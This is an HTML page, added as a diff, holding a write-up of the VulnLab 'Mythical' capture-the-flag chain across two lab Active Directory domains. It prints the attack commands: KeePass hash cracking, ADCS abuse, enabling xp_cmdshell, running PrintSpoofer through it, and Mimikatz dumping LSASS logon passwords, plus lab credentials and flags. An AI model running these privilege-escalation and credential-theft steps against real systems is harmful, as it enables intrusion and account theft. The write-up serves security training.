@@ -1,0 +1,430 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Mythical — El Niño · CTF Writeups</title>
+<meta name="description" content="VulnLab Mythical chain: Mythic C2 foothold, KeePass credentials, ADCS to US Administrator, trust abuse into MYTHICAL-EU, MSSQL xp_cmdshell, PrintSpoofer to DC02 SYSTEM, and Mimikatz recovers the root flag from LSASS memory.">
+<style>
+  :root{
+    --bg:#fcfcfb; --panel:#ffffff; --ink:#17181d; --ink-2:#3a3d44; --muted:#6b7280;
+    --line:#e7e8ec; --line-2:#d7d9de; --hair:#eef0f2;
+    --accent:#6d28d9; --accent-soft:#f2ecfd; --map:#e4e7ec; --map-2:#eef1f4;
+    --mono:'JetBrains Mono','SF Mono','Cascadia Code',ui-monospace,monospace;
+    --sans:'Inter',-apple-system,BlinkMacSystemFont,'SF Pro Text','Segoe UI',sans-serif;
+  }
+  *{box-sizing:border-box}
+  html{-webkit-text-size-adjust:100%}
+  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
+    font-size:17px;line-height:1.6;-webkit-font-smoothing:antialiased}
+  canvas#map{position:fixed;inset:0;z-index:0;pointer-events:none}
+  .wrap{position:relative;z-index:1;max-width:860px;margin:0 auto;padding:0 26px 100px}
+  a{color:inherit;text-decoration:none}
+
+  /* header */
+  .top{display:flex;align-items:center;justify-content:space-between;padding:26px 0;
+    font-family:var(--mono);font-size:12.5px;color:var(--muted)}
+  .brand{display:flex;align-items:center;gap:9px;color:var(--ink);font-weight:600;letter-spacing:.01em}
+  .tick{width:10px;height:10px;border:1.5px solid var(--ink);transform:rotate(45deg)}
+
+  /* hero */
+  .hero{padding:52px 0 40px;border-bottom:1px solid var(--line)}
+  .eyebrow{font-family:var(--mono);font-size:11.5px;letter-spacing:.16em;text-transform:uppercase;
+    color:var(--muted);margin-bottom:8px}
+  h1{font-size:clamp(52px,11vw,116px);line-height:.92;margin:.12em 0 .1em;letter-spacing:-.04em;
+    font-weight:800;text-wrap:balance}
+  .lede{font-size:19px;color:var(--ink-2);max-width:56ch;margin:.5em 0 0;line-height:1.5}
+  .byline{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:22px;
+    display:flex;gap:14px;flex-wrap:wrap;align-items:center}
+  .byline b{color:var(--ink)}
+  .owned{border:1px solid var(--accent);color:var(--accent);border-radius:2px;
+    padding:2px 8px;font-size:11px;letter-spacing:.06em;text-transform:uppercase}
+
+  /* fingerprint card */
+  .fp{margin-top:32px;border:1px solid var(--line);border-radius:4px;overflow:hidden;
+    font-family:var(--mono);font-size:13px}
+  .fp .r{display:flex;justify-content:space-between;align-items:center;
+    padding:16px 20px;background:var(--hair);border-bottom:1px solid var(--line)}
+  .name{font-size:22px;font-family:var(--sans);font-weight:700;letter-spacing:-.02em}
+  .chips{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:4px}
+  .chips b{color:var(--ink)}
+  .rate{text-align:right}.big{font-size:28px}
+  .fp .grid{display:grid;grid-template-columns:1fr 1fr;gap:0;padding:0}
+  .fp .grid span{padding:11px 20px;border-bottom:1px solid var(--hair);color:var(--ink-2);font-size:12.5px}
+  .fp .grid span:last-child,.fp .grid span:nth-last-child(2):nth-child(odd){border-bottom:none}
+  .fp .grid b{color:var(--ink)}
+
+  /* sections */
+  section{margin-top:52px}
+  .step-h{display:flex;align-items:baseline;gap:16px;margin-bottom:14px}
+  .step-n{font-family:var(--mono);font-size:11px;color:var(--muted);letter-spacing:.1em;
+    padding-top:3px;min-width:22px}
+  h2{font-size:26px;letter-spacing:-.02em;font-weight:700;margin:0}
+  p{color:var(--ink-2);margin:.6em 0}
+  p b, p strong{color:var(--ink)}
+
+  /* chain diagram */
+  .chain{font-family:var(--mono);font-size:13px;line-height:1.9;
+    background:#f9f8ff;border:1px solid var(--line-2);border-left:3px solid var(--accent);
+    border-radius:2px;padding:18px 22px;margin:20px 0;color:var(--ink-2);
+    white-space:pre;overflow-x:auto}
+  .chain b{color:var(--ink)}
+
+  /* code */
+  pre{margin:18px 0;border-radius:3px;overflow-x:auto;
+    background:#f9f8ff;border:1px solid var(--line-2)}
+  pre code{display:block;padding:16px 18px;font-family:var(--mono);font-size:13px;
+    line-height:1.7;color:var(--ink-2)}
+  code{font-family:var(--mono);font-size:.87em;color:var(--accent);
+    background:var(--accent-soft);padding:1px 5px;border-radius:2px}
+  pre code{color:var(--ink-2);background:none;padding:0;font-size:13px}
+
+  /* output block */
+  .out{background:#17181d;border-radius:3px;padding:16px 18px;margin:10px 0;
+    font-family:var(--mono);font-size:12.5px;line-height:1.75;color:#a8b4c8;
+    overflow-x:auto}
+  .out .ok{color:#34d399}.out .hi{color:#a78bfa}.out .warn{color:#fbbf24}
+  .out .flag{color:#f9a8d4;font-weight:600}
+
+  /* dead-ends */
+  .dead{border:1px solid var(--hair);border-radius:3px;padding:14px 18px;margin:12px 0;
+    font-size:14.5px;color:var(--muted)}
+  .dead code{font-size:.85em}
+  .dead-label{font-family:var(--mono);font-size:10.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:18px;
+    display:flex;align-items:center;gap:8px}
+  .dead-label::after{content:"";flex:1;height:1px;background:var(--hair)}
+
+  /* callout / insight */
+  .callout{border-radius:3px;padding:18px 20px;margin:24px 0;
+    background:var(--accent-soft);border:1px solid #ddd6fe}
+  .callout .k{font-family:var(--mono);font-size:11.5px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--accent);font-weight:600;display:block;margin-bottom:6px}
+  .callout p{margin:0;font-size:15px}
+
+  /* insight grid */
+  .insight-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1px;
+    background:var(--line);border:1px solid var(--line);border-radius:2px;overflow:hidden;margin:20px 0}
+  .insight-item{background:var(--panel);padding:18px 20px}
+  .insight-item .i-num{font-family:var(--mono);font-size:11px;color:var(--muted);margin-bottom:6px}
+  .insight-item .i-title{font-size:15px;font-weight:700;letter-spacing:-.01em;margin-bottom:6px}
+  .insight-item .i-body{font-size:13.5px;color:var(--ink-2);line-height:1.55}
+
+  /* flags */
+  .flags{display:flex;gap:12px;flex-wrap:wrap;margin:20px 0}
+  .flag-box{border:1px solid var(--line-2);border-radius:3px;padding:12px 16px;flex:1;min-width:200px}
+  .flag-box .fl{font-family:var(--mono);font-size:11px;letter-spacing:.1em;
+    text-transform:uppercase;color:var(--muted);margin-bottom:5px}
+  .flag-box .fv{font-family:var(--mono);font-size:14px;color:var(--accent);
+    font-weight:600;letter-spacing:.03em;word-break:break-all}
+
+  /* figures */
+  figure{margin:22px 0}
+  figure img{width:100%;border-radius:3px;border:1px solid var(--line)}
+  figcaption{font-family:var(--mono);font-size:11.5px;color:var(--muted);
+    margin-top:8px;text-align:center}
+
+  /* table */
+  .tbl-wrap{overflow-x:auto;margin:16px 0}
+  table{width:100%;border-collapse:collapse;font-size:14px}
+  th,td{text-align:left;padding:9px 12px;border-bottom:1px solid var(--hair);vertical-align:top}
+  th{font-family:var(--mono);font-size:11px;letter-spacing:.07em;text-transform:uppercase;
+    color:var(--muted);font-weight:600}
+  td.mon{font-family:var(--mono);font-size:12.5px;color:var(--ink)}
+  td.acc{font-family:var(--mono);font-size:12.5px;color:var(--accent);font-weight:600}
+
+  footer{margin-top:64px;padding-top:28px;border-top:1px solid var(--line);
+    font-family:var(--mono);font-size:12px;color:var(--muted);line-height:1.7}
+  footer a{color:var(--accent)}
+  [data-morph]{white-space:pre}
+  @media(max-width:600px){.fp .grid{grid-template-columns:1fr}.chain{font-size:12px}}
+</style>
+</head>
+<body>
+<canvas id="map"></canvas>
+<div class="wrap">
+  <div class="top">
+    <a class="brand" href="../" style="border:none"><span class="tick"></span> el-niño</a>
+    <span>10°N · 90°W</span>
+  </div>
+
+  <header class="hero">
+    <div class="eyebrow">VulnLab · chain</div>
+    <h1><span data-morph="hero">Mythical</span></h1>
+    <p class="lede">A Mythic C2 assessment that turns an existing US SYSTEM callback into a two-domain compromise: KeePass credentials, ADCS abuse, a one-way trust hop, SQL Server command execution, PrintSpoofer on DC02, and a final flag recovered from root's live logon memory.</p>
+    <div class="byline">
+      <span>by <b>ssephi</b></span>
+      <span>· 23·07·2026</span>
+      <span>· ~30 min</span>
+      <span class="owned">● fully owned</span>
+    </div>
+
+    <div class="fp">
+      <div class="r">
+        <div>
+          <p class="name" style="margin:0"><span data-morph="title">Mythical</span></p>
+          <div class="chips">Windows · <b>Chain</b> · Mythic + AD + MSSQL</div>
+        </div>
+        <div class="rate"><div class="big">🏴</div><div class="chips">US + EU owned</div></div>
+      </div>
+      <div class="grid">
+        <span><b>c2</b> &nbsp;Mythic callback 19 &nbsp;· &nbsp;DC01 SYSTEM</span>
+        <span><b>US</b> &nbsp;MYTHICAL-US.VL &nbsp;· &nbsp;DC01</span>
+        <span><b>EU</b> &nbsp;MYTHICAL-EU.VL &nbsp;· &nbsp;DC02</span>
+        <span><b>loot</b> &nbsp;KeePass <code>it.kdbx</code> → <code>domjoin</code></span>
+        <span><b>pivot</b> &nbsp;outbound trust + <code>\\dc02\dev</code></span>
+        <span><b>finish</b> &nbsp;MSSQL sysadmin → PrintSpoofer → Mimikatz</span>
+      </div>
+    </div>
+  </header>
+
+  <section>
+    <h2>The shape of it</h2>
+    <p>Mythical starts in a different place from a normal web box: there is already a live Mythic Apollo callback as <b>NT AUTHORITY\SYSTEM</b> on <code>DC01</code>. The work is not initial access; it is turning that execution context into disciplined evidence. Mythic's task output matters, but so do its file objects: a <code>download</code> task returns an agent file UUID, and the actual bytes have to be fetched from the Mythic server.</p>
+    <p>The chain moves through three layers. First, recover operator and domain material from the US side: a KeePass database, a reusable domain-join entry, ADCS abuse, and an Administrator/SYSTEM shell. Second, pivot across the trust into <code>MYTHICAL-EU</code>, where a writable <code>dev</code> share exposes a .NET helper with LDAP credentials and an MSSQL path. Third, abuse SQL Server execution and <code>SeImpersonatePrivilege</code> on DC02, then use Mimikatz to read root's flag from LSASS memory.</p>
+
+    <div class="chain">Mythic Apollo callback 19 → <b>DC01 SYSTEM</b>
+  └─ Mythic file history → <b>it.kdbx</b>
+       └─ keepass2john / john → password <b>741852</b>
+            └─ KeePass entry → <b>domjoin / hKvhexY5BtAgtWAY</b>
+                 └─ ADCS + Rubeus → US Administrator material
+                      └─ SYSTEM shell on <b>MYTHICAL-US\DC01</b>
+
+DC01 → nltest /domain_trusts
+  └─ outbound trust to <b>MYTHICAL-EU.VL</b>
+       └─ \\dc02.mythical-eu.vl\dev → getusers.exe
+            └─ .NET strings → <b>svc_ldap / osaRXWkDf2y5SGh5</b>
+                 └─ svc_sql same password / integrated SQL context
+                      └─ MSSQL sysadmin → xp_cmdshell
+                           └─ PrintSpoofer → <b>DC02 SYSTEM</b>
+                                └─ Mimikatz sekurlsa → <b>root flag in wdigest</b></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">01 · mythic evidence</div>
+    <div class="step-h"><span class="step-n">01</span><h2><span data-morph="title">Callback 19 and file objects</span></h2></div>
+    <p>The active foothold was Mythic callback <code>19</code>, an Apollo agent on <code>DC01</code> running as SYSTEM. The first important correction was about Mythic downloads: the task result is not necessarily file content. It can be a file UUID that must be retrieved through Mythic's file API.</p>
+
+    <pre><code>query {
+  filemeta(where: {agent_file_id: {_eq: "ecd89cf2-9164-4191-92e8-0cdf70a484f3"}}) {
+    agent_file_id
+    filename_text
+    complete
+    chunks_received
+    total_chunks
+  }
+}</code></pre>
+
+    <div class="out"><span class="ok">agent_file_id</span> ecd89cf2-9164-4191-92e8-0cdf70a484f3
+<span class="ok">filename</span> flag.txt
+<span class="ok">complete</span> true
+<span class="flag">MYTH{76cf35201cef0f28026e5bc18e9caa87}</span></div>
+
+    <div class="callout">
+      <span class="k">Evidence rule</span>
+      <p>A Mythic task line that looks like a UUID is a pointer, not proof. Fetch the registered file, decode base64 metadata when needed, and verify the bytes.</p>
+    </div>
+  </section>
+
+  <section>
+    <div class="eyebrow">02 · credential recovery</div>
+    <div class="step-h"><span class="step-n">02</span><h2><span data-morph="title">KeePass and ADCS</span></h2></div>
+    <p>Mythic file history exposed <code>it.kdbx</code>. After fetching the database, <code>keepass2john</code> produced a hash and John cracked the master password as <code>741852</code>. The KeePass entry of interest was <code>domjoin</code>, with password <code>hKvhexY5BtAgtWAY</code>.</p>
+
+    <pre><code>keepass2john it.kdbx > keepass.hash
+john keepass.hash --wordlist=rockyou.txt
+pykeepass it.kdbx --password 741852</code></pre>
+
+    <div class="out"><span class="ok">KeePass password</span> 741852
+<span class="ok">entry</span> domjoin
+<span class="ok">password</span> hKvhexY5BtAgtWAY</div>
+
+    <p>The US path then follows the intended ADCS route: enumerate templates, request a certificate for Administrator, convert it to PFX, and use Rubeus <code>/getcredentials</code> to recover Administrator material. That material was enough to launch or reuse a SYSTEM-level Mythic execution context on DC01.</p>
+  </section>
+
+  <section>
+    <div class="eyebrow">03 · domain trust</div>
+    <div class="step-h"><span class="step-n">03</span><h2><span data-morph="title">From US to EU</span></h2></div>
+    <p>On DC01, <code>nltest /domain_trusts /all_trusts</code> showed a direct outbound trust to <code>MYTHICAL-EU.VL</code>. The EU domain controller resolved as <code>dc02.mythical-eu.vl</code>, and the custom share <code>\\dc02.mythical-eu.vl\dev</code> was readable and writable from the DC01 context.</p>
+
+    <div class="out"><span class="ok">trust</span> MYTHICAL-US → MYTHICAL-EU
+<span class="ok">dc02</span> 192.168.1.20
+<span class="ok">share</span> \\dc02.mythical-eu.vl\dev
+<span class="ok">files</span> Autologon64.exe, getusers.exe</div>
+
+    <p>The <code>getusers.exe</code> binary was a .NET assembly. Pulling strings out of it revealed hardcoded LDAP credentials and the target LDAP path:</p>
+
+    <div class="out"><span class="ok">LDAP</span> LDAP://dc02.mythical-eu.vl
+<span class="ok">user</span> svc_ldap
+<span class="ok">password</span> osaRXWkDf2y5SGh5</div>
+
+    <p>Those credentials enumerated the EU users, including <code>svc_ldap</code>, <code>svc_sql</code>, and <code>root</code>. The same password was reused for <code>svc_sql</code>, and integrated SQL access from the DC01 context landed as <code>MYTHICAL-EU\svc_sql</code>.</p>
+  </section>
+
+  <section>
+    <div class="eyebrow">04 · mssql</div>
+    <div class="step-h"><span class="step-n">04</span><h2><span data-morph="title">SQL Server to command execution</span></h2></div>
+    <p>DC02 exposed MSSQL on <code>1433</code>. SQL authentication with the service password failed, but integrated authentication from the current context succeeded. The resulting principal was sysadmin, which made <code>xp_cmdshell</code> available after enabling the advanced option.</p>
+
+    <pre><code>C:\Program Files\SqlCmd\sqlcmd.exe -S dc02.mythical-eu.vl -E -Q "SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin');"
+C:\Program Files\SqlCmd\sqlcmd.exe -S dc02.mythical-eu.vl -E -Q "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"</code></pre>
+
+    <div class="out"><span class="ok">SYSTEM_USER</span> MYTHICAL-EU\svc_sql
+<span class="ok">sysadmin</span> 1
+<span class="ok">xp_cmdshell</span> enabled</div>
+
+    <p>Commands launched by SQL ran as the SQL Server service account on DC02, with <code>SeImpersonatePrivilege</code>. That is the hinge for local SYSTEM.</p>
+  </section>
+
+  <section>
+    <div class="eyebrow">05 · dc02 system</div>
+    <div class="step-h"><span class="step-n">05</span><h2><span data-morph="title">PrintSpoofer on DC02</span></h2></div>
+    <p>A known-good <code>PrintSpoofer_x64.exe</code> was already present in the Apollo agent source tree. Uploading it to the EU dev share and executing it through <code>xp_cmdshell</code> produced SYSTEM commands on DC02.</p>
+
+    <pre><code>upload PrintSpoofer_x64.exe \\dc02.mythical-eu.vl\dev\ps.exe
+EXEC xp_cmdshell '\\dc02.mythical-eu.vl\dev\ps.exe -i -c "whoami /priv"';</code></pre>
+
+    <div class="out"><span class="ok">[+]</span> Found privilege: SeImpersonatePrivilege
+<span class="ok">[+]</span> Named pipe listening...
+<span class="ok">[+]</span> CreateProcessAsUser() OK
+<span class="ok">whoami</span> mythical-eu\dc02$</div>
+
+    <p>With DC02 SYSTEM confirmed, <code>C:\Users\Administrator\Desktop\root.txt</code> became readable. It was not the flag. It was the clue.</p>
+
+    <div class="out"><span class="warn">root.txt</span>
+The flag is in memory (user "root").</div>
+  </section>
+
+  <section>
+    <div class="eyebrow">06 · memory</div>
+    <div class="step-h"><span class="step-n">06</span><h2><span data-morph="title">The flag was a logon secret</span></h2></div>
+    <p>The first instinct was to scan the root user's GUI process memory: <code>explorer.exe</code>, <code>ctfmon.exe</code>, <code>RuntimeBroker.exe</code>, <code>SearchApp.exe</code>, and friends. That produced a lot of memory noise and no reliable <code>MYTH{...}</code>. A public writeup confirmed the intended direction: use Mimikatz against LSASS and search the logon sessions.</p>
+
+    <pre><code>\\dc02.mythical-eu.vl\dev\mk.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\dev\mkout.txt</code></pre>
+
+    <div class="out">Session           : Interactive from 1
+User Name         : root
+Domain            : MYTHICAL-EU
+Logon Server      : DC02
+
+wdigest :
+  * Username : root
+  * Domain   : MYTHICAL-EU
+  * Password : <span class="flag">MYTH{5ce966ce482c67269934e0d01c169b20}</span></div>
+  </section>
+
+  <section>
+    <div class="eyebrow">07 · proof</div>
+    <div class="step-h"><span class="step-n">07</span><h2><span data-morph="title">Flags recovered</span></h2></div>
+    <div class="flags">
+      <div class="flag-box"><div class="fl">US Administrator desktop</div><div class="fv">MYTH{76cf35201cef0f28026e5bc18e9caa87}</div></div>
+      <div class="flag-box"><div class="fl">EU temp/user flag</div><div class="fv">MYTH{306e2c1b5690892f21b5d86ea4bbdbc3}</div></div>
+      <div class="flag-box"><div class="fl">EU root memory</div><div class="fv">MYTH{5ce966ce482c67269934e0d01c169b20}</div></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="dead-label">dead ends that paid rent</div>
+    <div class="dead"><b>File UUID confusion.</b> Treating the Mythic download response as file content made the first flag look wrong. The fix was querying <code>filemeta</code> and using the file UUID as a fetch handle.</div>
+    <div class="dead"><b>SQL authentication.</b> <code>svc_sql</code> did not work as a direct SQL login. Integrated auth from the compromised context did, and it was sysadmin.</div>
+    <div class="dead"><b>Process dump scanning.</b> Full GUI dumps and chunk scans were noisy. The clue said memory, but the intended memory was LSASS logon material.</div>
+  </section>
+
+  <section>
+    <div class="eyebrow">08 · notes</div>
+    <div class="step-h"><span class="step-n">08</span><h2><span data-morph="title">Takeaways</span></h2></div>
+    <div class="insight-grid">
+      <div class="insight-item"><div class="i-num">01</div><div class="i-title">C2 artifacts are evidence objects</div><div class="i-body">A task result, a file UUID, file metadata, and downloaded bytes are different layers. Closing the loop means validating the final layer.</div></div>
+      <div class="insight-item"><div class="i-num">02</div><div class="i-title">Trusts turn local admin into map reading</div><div class="i-body">Once DC01 was SYSTEM, <code>nltest</code>, DNS, and shares quickly exposed the next domain's attack surface.</div></div>
+      <div class="insight-item"><div class="i-num">03</div><div class="i-title">SQL context matters</div><div class="i-body">The failed SQL password was not the end. The Windows token already had a route to an integrated, sysadmin SQL session.</div></div>
+      <div class="insight-item"><div class="i-num">04</div><div class="i-title">Read the clue literally</div><div class="i-body">"The flag is in memory" was not a call for blind process dumping. It was a hint that root had an interactive logon secret in LSASS.</div></div>
+    </div>
+  </section>
+
+  <section>
+    <div class="eyebrow">09 · timeline</div>
+    <div class="step-h"><span class="step-n">09</span><h2><span data-morph="title">Attack timeline</span></h2></div>
+    <div class="tbl-wrap">
+      <table>
+        <thead><tr><th>Step</th><th>Evidence</th></tr></thead>
+        <tbody>
+          <tr><td class="mon">01</td><td>Callback 19 confirmed as Apollo SYSTEM on DC01</td></tr>
+          <tr><td class="mon">02</td><td>Mythic file UUID fetched into the first verified flag</td></tr>
+          <tr><td class="mon">03</td><td><code>it.kdbx</code> cracked with KeePass password <code>741852</code></td></tr>
+          <tr><td class="mon">04</td><td>US Administrator/SYSTEM path completed through certificate material</td></tr>
+          <tr><td class="mon">05</td><td>Outbound trust to <code>MYTHICAL-EU.VL</code> mapped</td></tr>
+          <tr><td class="mon">06</td><td><code>getusers.exe</code> exposed <code>svc_ldap</code> credentials</td></tr>
+          <tr><td class="mon">07</td><td>Integrated MSSQL context had sysadmin on DC02</td></tr>
+          <tr><td class="mon">08</td><td>PrintSpoofer converted SQL service context into DC02 SYSTEM</td></tr>
+          <tr><td class="mon">09</td><td>Mimikatz found root's WDigest password as the final flag</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <p style="font-family:var(--mono);font-size:13px;color:var(--muted)">Total time: one focused operator loop, with a few noisy memory-scan detours.</p>
+  </section>
+
+  <footer>
+    <p>Authorized lab work only — Mythical is a VulnLab chain on a sanctioned network.<br>
+    Mythic C2 · ADCS · domain trust · MSSQL · PrintSpoofer · Mimikatz. Charted by ssephi.
+    <br><a href="../">← All machines</a></p>
+  </footer>
+</div>
+
+<script>
+(function map(){
+  const c=document.getElementById("map"),x=c.getContext("2d");let W,H;
+  function line(v){return getComputedStyle(document.documentElement).getPropertyValue(v).trim();}
+  function size(){W=c.width=innerWidth*devicePixelRatio;H=c.height=innerHeight*devicePixelRatio;draw();}
+  function draw(){
+    x.clearRect(0,0,W,H);const dpr=devicePixelRatio;
+    x.strokeStyle=line('--map-2');x.lineWidth=1*dpr;
+    for(let gx=0;gx<W;gx+=150*dpr){x.beginPath();x.moveTo(gx,0);x.lineTo(gx,H);x.stroke();}
+    for(let gy=0;gy<H;gy+=150*dpr){x.beginPath();x.moveTo(0,gy);x.lineTo(W,gy);x.stroke();}
+    x.strokeStyle=line('--map');x.lineWidth=1.15*dpr;
+    const rings=(cx,cy,rot,n)=>{for(let i=0;i<n;i++){x.globalAlpha=0.9-i*0.05;
+      x.beginPath();x.ellipse(cx,cy,(50+i*46)*dpr,(34+i*32)*dpr,rot,0,7);x.stroke();}};
+    rings(W*0.80,H*0.20,-0.5,9);
+    rings(W*0.14,H*0.86,0.35,7);
+    x.globalAlpha=1;
+  }
+  addEventListener("resize",size);size();
+})();
+
+(function morph(){
+  const GLITCH="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#$%&*!?<>{}[]=/\\|~^`";
+  const MODES={brand:{maxActive:2,resolveSpeed:0.04,mutateChance:0.008},
+               title:{maxActive:4,resolveSpeed:0.06,mutateChance:0.015},
+               hero:{maxActive:8,resolveSpeed:0.08,mutateChance:0.025}};
+  const g=()=>GLITCH[Math.floor(Math.random()*GLITCH.length)];
+  const skip=ch=>ch===" "||ch==="."||ch.charCodeAt(0)>127;
+  const units=[];
+  document.querySelectorAll("[data-morph]").forEach(el=>{
+    const cfg=MODES[el.dataset.morph]||MODES.title;
+    const chars=[...el.textContent].map(ch=>{const s=document.createElement("span");
+      s.textContent=ch;s.style.display="inline-block";if(ch===" ")s.style.minWidth="0.28em";
+      return{original:ch,el:s,prog:0,dir:"resolving"};});
+    el.textContent="";chars.forEach(c=>el.appendChild(c.el));units.push({cfg,chars});
+  });
+  if(!units.length||matchMedia("(prefers-reduced-motion:reduce)").matches)return;
+  let last=0;const INT=50;
+  function paint(c){const p=c.prog,e=c.el;
+    if(p>0){e.style.color=`rgba(109,40,217,${0.55+p*0.45})`;
+      e.style.textShadow=p>0.5?`0 0 ${3+p*5}px rgba(109,40,217,${p*0.28})`:"";
+      e.style.transform=`translateY(${(Math.random()-0.5)*p*1.4}px)`;}
+    else{e.style.color="";e.style.textShadow="";e.style.transform="";e.style.transition="color 200ms ease";}}
+  function frame(now){requestAnimationFrame(frame);if(now-last<INT)return;last=now;
+    units.forEach(u=>{let active=u.chars.filter(c=>c.prog>0).length;
+      u.chars.forEach(c=>{if(skip(c.original))return;
+        if(c.dir==="glitching"){c.prog=Math.min(1,c.prog+0.15+Math.random()*0.1);
+          if(c.prog>=1)c.dir="resolving";c.el.textContent=g();}
+        else if(c.prog>0){c.prog=Math.max(0,c.prog-u.cfg.resolveSpeed-Math.random()*0.02);
+          if(c.prog<=0){c.el.textContent=c.original;c.prog=0;}
+          else c.el.textContent=Math.random()<c.prog?g():c.original;}
+        if(c.prog===0&&active<u.cfg.maxActive&&Math.random()<u.cfg.mutateChance){
+          c.dir="glitching";c.prog=0.05;c.el.textContent=g();active++;}
+        paint(c);});});}
+  requestAnimationFrame(frame);
+})();
+</script>
+</body>
+</html>
